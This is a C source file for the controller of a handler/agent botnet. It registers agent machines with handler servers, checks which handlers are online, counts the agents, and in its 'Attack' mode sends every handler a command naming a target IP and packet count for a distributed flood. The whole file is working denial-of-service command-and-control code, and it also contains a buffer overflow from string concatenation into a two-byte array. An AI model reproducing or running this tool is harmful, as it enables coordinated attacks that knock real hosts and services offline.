#include <stdio.h>      /* for printf() and fprintf() */
#include <sys/socket.h> /* for socket(), connect(), send(), and recv() */
#include <arpa/inet.h>  /* for sockaddr_in and inet_addr() */
#include <stdlib.h>     /* for atoi() and exit() */
#include <string.h>     /* for memset() */
#include <unistd.h>     /* for close() */

#define RCVBUFSIZE 32   /* Size of receive buffer */
#define DEFAULT 2112    /* Default port */

void DieWithError(char *errorMessage);  /* Error handling function */
int receiveMessage(int sock, char *buf, int maxLen);

int main(int argc, char *argv[])
{	
	int totalAgent = 0;				 /* Count the total agents */
    int sock;                        /* Socket descriptor */
    int mode;                        /* Mode operation */
    int packets;                     /* Number of packets */
    struct sockaddr_in echoServAddr; /* Echo server address */
    unsigned short echoServPort;     /* Echo server port */
    char *HandlerIP;                 /* Handler IP address (dotted quad) */
    char *AgentIP;                   /* Agent IP address (dotted quad) */
    char *TargetIP;                  /* Target IP address (dotted quad) */
    char HandlerFile[256];           /* Handler file name */
    char ViableHandler[256];         /* Validated Handlers */
    char *echoString;                /* String to send to echo server */
    char echoBuffer[RCVBUFSIZE];     /* Buffer for echo string */
    unsigned int echoStringLen;      /* Length of string to echo */
    int bytesRcvd, totalBytesRcvd;   /* Bytes read in single recv() 
                                        and total bytes read */
	FILE*inFile;
	FILE*outFile;

    if (argc <= 2)    /* Test for correct number of arguments */
    {
        //fprintf(stderr, "Usage: %s <Server IP> <Echo Word> [<Echo Port>]\n",argv[0]);
        printf("== Mode of operation ==\n");
        fprintf(stderr, "1.Add Agent to Handler:\t  %s <Mode No.> <Handler IP> <Agent IP>\n", argv[0]);
        fprintf(stderr, "2.Interrogate Handlers:\t  %s <Mode No.> <Handler File> \n", argv[0]);
        fprintf(stderr, "3.Validate Agents:\t  %s <Mode No.> <ValidatedHandler.txt> \n", argv[0]);
        fprintf(stderr, "4.Count Agents:\t  %s <Mode No.> <ValidatedHandler.txt> \n", argv[0]);
        fprintf(stderr, "5.Attack:\t  %s <Mode No.> <ValidatedHandler.txt> <Target IP> [<Packets>] \n", argv[0]);
        exit(1);
    }

    echoServPort = DEFAULT;
    mode = atoi(argv[1]);
    switch(mode) {
        case 1 :
            HandlerIP = argv[2];
            AgentIP = argv[3];
            
            /* Construct message */
            char temp[2]; 
            strcpy(temp, argv[1]);	// Store mode operation into temp[2]

            echoString = temp;
            strcat(echoString, ":");	
            strcat(echoString, AgentIP);
            strcat(echoString, "\n");

            /* Create a reliable, stream socket using TCP */
    		if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        	DieWithError("socket() failed");

		    /* Construct the handler server address structure */
		    memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    		echoServAddr.sin_family      = AF_INET;             /* Internet address family */
   			echoServAddr.sin_addr.s_addr = inet_addr(HandlerIP);   /* Server IP address */
    		echoServAddr.sin_port        = htons(echoServPort); /* Server port */

   	 		/* Establish the connection to the handler server */
    		if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
        	DieWithError("connect() failed");

        	echoStringLen = strlen(echoString); 
        	/* Send the string to the server */
   		 	if (send(sock, echoString, echoStringLen, 0) != echoStringLen)
        	DieWithError("send() sent a different number of bytes than expected");

        	totalBytesRcvd = 0;
    		printf("Received: ");                /* Setup to print the echoed string */
            receiveMessage(sock, echoString, RCVBUFSIZE);
            printf("%s", echoString);
    		//printf("\n");    /* Print a final linefeed */
    		close(sock);
            break;
        case 2 :
            strcpy(HandlerFile, argv[2]);
            
    		inFile=fopen(HandlerFile,"r");
    		outFile=fopen("ValidatedHandler.txt","w");

        	if(inFile!=NULL) {
				char line[256];
        	
    			while(fgets(line, sizeof(line), inFile) != NULL) {
    				char* p = &line[0]; 
    				
    				printf("Trying %s ...\n", p);
            		/* Create a reliable, stream socket using TCP */
    				if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        			DieWithError("socket() failed");
        			
		    		/* Construct the server address structure */
		    		memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    				echoServAddr.sin_family      = AF_INET;             /* Internet address family */
   					echoServAddr.sin_addr.s_addr = inet_addr(p);   /* Server IP address */
    				echoServAddr.sin_port        = htons(echoServPort); /* Server port */
        			
   	 				/* Establish the connection to the echo server */
    				if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
        				printf("Handler offline: %s \n", p);
        			else {
                        char ver[RCVBUFSIZE];
                        strcpy(ver, "2:1");
                        send(sock, ver,strlen(ver),0);
                        if (receiveMessage(sock, ver, RCVBUFSIZE)<0) 
                            strcpy(ver,"N/a");
                        
        				printf("Handler in operation: %s, its version is %s \n", p,ver);
        				fprintf(outFile, "%s", p);
        			} 
        				
        			close(sock);
    			}
    			printf("Viable Handlers have been updated\n");
   			}
   			fclose(inFile);
   			fclose(outFile);
            break;
        case 3 :
            strcpy(ViableHandler, argv[2]);
            
            inFile=fopen("ValidatedHandler.txt","r");

			if(inFile!=NULL) {
				char line[256];
        	
    			while(fgets(line, sizeof(line), inFile) != NULL) {
    				char* p = &line[0]; 
    				
    				printf("Trying %s", p);
            		/* Create a reliable, stream socket using TCP */
    				if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        			DieWithError("socket() failed");
        			
		    		/* Construct the server address structure */
		    		memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    				echoServAddr.sin_family      = AF_INET;             /* Internet address family */
   					echoServAddr.sin_addr.s_addr = inet_addr(p);   /* Server IP address */
    				echoServAddr.sin_port        = htons(echoServPort); /* Server port */
        			
   	 				/* Establish the connection to the echo server */
    				if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
        				printf("Handler offline: %s", p);
        			else {
        				printf("Handler in operation: %s", p);
        			}

        			echoString = "3:\n";
					echoStringLen = strlen(echoString); 
        			/* Send the string to the server */
   		 			if (send(sock, echoString, echoStringLen, 0) != echoStringLen)
        			DieWithError("send() sent a different number of bytes than expected");

        			totalBytesRcvd = 0;

    				printf("Number of agents: ");                /* Setup to print the echoed string */
   		 			while (totalBytesRcvd < echoStringLen)
   					{
        				/* Receive up to the buffer size (minus 1 to leave space for
         		 		 a null terminator) bytes from the sender */
       			 		if ((bytesRcvd = recv(sock, echoBuffer, RCVBUFSIZE - 1, 0)) <= 0)
           					DieWithError("recv() failed or connection closed prematurely");
        					
        					totalBytesRcvd += bytesRcvd;   /* Keep tally of total bytes */
        					echoBuffer[bytesRcvd] = '\0';  /* Terminate the string! */
        					printf("%s", echoBuffer);      /* Print the echo buffer */
    				}

    				printf("\n");    /* Print a final linefeed */
    				close(sock);        				
    			}
   			}
   			fclose(inFile);           
            break;
        case 4 :
            strcpy(ViableHandler, argv[2]);
            inFile=fopen("ValidatedHandler.txt","r");

			if(inFile!=NULL) {
				char line[256];
        	
    			while(fgets(line, sizeof(line), inFile) != NULL) {
    				char* p = &line[0]; 
    				
    				printf("Trying %s", p);
            		/* Create a reliable, stream socket using TCP */
    				if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        			DieWithError("socket() failed");
        			
		    		/* Construct the server address structure */
		    		memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    				echoServAddr.sin_family      = AF_INET;             /* Internet address family */
   					echoServAddr.sin_addr.s_addr = inet_addr(p);   /* Server IP address */
    				echoServAddr.sin_port        = htons(echoServPort); /* Server port */
        			
   	 				/* Establish the connection to the echo server */
    				if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
        				printf("Handler offline: %s", p);
        			else {
        				printf("Handler in operation: %s", p);
        			}

        			echoString = "3:\n";
					echoStringLen = strlen(echoString); 
        			/* Send the string to the server */
   		 			if (send(sock, echoString, echoStringLen, 0) != echoStringLen)
        			DieWithError("send() sent a different number of bytes than expected");

        			totalBytesRcvd = 0;
    				printf("Total agents: ");                /* Setup to print the echoed string */
   		 			while (totalBytesRcvd < echoStringLen)
   					{
        				/* Receive up to the buffer size (minus 1 to leave space for
         		 		 a null terminator) bytes from the sender */
       			 		if ((bytesRcvd = recv(sock, echoBuffer, RCVBUFSIZE - 1, 0)) <= 0)
           					DieWithError("recv() failed or connection closed prematurely");
        					
        					totalBytesRcvd += bytesRcvd;   /* Keep tally of total bytes */
        					echoBuffer[bytesRcvd] = '\0';  /* Terminate the string! */
    				}
    				totalAgent += atoi(echoBuffer);
    				printf("%d\n", totalAgent);
    				printf("\n");    /* Print a final linefeed */
    				close(sock);
    				
    			}
   			}
   			fclose(inFile);                       
            break;
        case 5 :
           
            //arg: viableHandler file , target IP
            strcpy(ViableHandler, argv[2]);
            TargetIP = argv[3];
            if (argc == 5)
                packets = atoi(argv[4]);
            else packets = 100;

            inFile=fopen("ValidatedHandler.txt","r");

			if(inFile!=NULL) {
				char line[256];
                echoString=(char *) malloc(100);
        	    sprintf(echoString,"%d:%s:%d\0",mode,TargetIP,packets);
                echoStringLen = strlen(echoString);    
    			while(fgets(line, sizeof(line), inFile) != NULL) {
    				char* p = &line[0];
    				
    				printf("Trying %s", p);
            		/* Create a reliable, stream socket using TCP */
    				if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
            			DieWithError("socket() failed");
            			
		    		/* Construct the server address structure */
		    		memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    				echoServAddr.sin_family      = AF_INET;             /* Internet address family */
   					echoServAddr.sin_addr.s_addr = inet_addr(p);   /* Server IP address */
    				echoServAddr.sin_port        = htons(echoServPort); /* Server port */
        			
   	 				/* Establish the connection to the echo server */
    				if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
        				printf("Failed to connect: %s", p);
        			else {
        				printf("Handler in operation: %s", p);
        			}
         			/* Send the string to the server */
   		 			if (send(sock, echoString, echoStringLen, 0) != echoStringLen)
            			DieWithError("send() sent a different number of bytes than expected");
                    close(sock);
        	    }
   			}
   			fclose(inFile);           

            break;
        default :
            printf("Invalid mode operation\n" );
            break;
    }
    return(0);
    
}


int receiveMessage(int sock, char *buf, int maxLen)
 {
        int received = 0;
        int rv = 0;
        memset(buf,0,maxLen);
        rv = recv(sock, buf+received, 1, 0);
        while ((received < maxLen) && (rv > 0) && *(buf+received) != '\n')
        {
         received += rv;
         rv = recv(sock, buf+received, 1, 0);
        }
        if (rv < 0)
        {
         DieWithError("recv() failed");
        }
        return received;
 };